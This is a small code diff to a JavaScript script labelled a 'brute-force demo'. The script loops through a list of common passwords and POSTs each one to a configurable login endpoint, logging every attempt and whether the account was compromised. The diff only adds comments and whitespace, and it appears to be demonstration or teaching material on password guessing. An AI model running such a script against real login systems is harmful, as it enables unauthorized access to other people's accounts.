@@ -14,6 +14,7 @@ const passwords = [
   "abc123",
 ];
 
+// Function to attempt login with a given password
 async function attemptLogin(password) {
   const res = await fetch(`${BASE_URL}/auth/login`, {
     method: "POST",
@@ -30,11 +31,12 @@ async function attemptLogin(password) {
   return res.headers.get("location");
 }
 
-(async () => {
+(async () => { 
   console.log("Starting brute-force demo...\n");
 
   let compromised = false;
-
+  
+  // Try each password
   for (const pwd of passwords) {
     console.log(`Trying password: ${pwd}`);
 
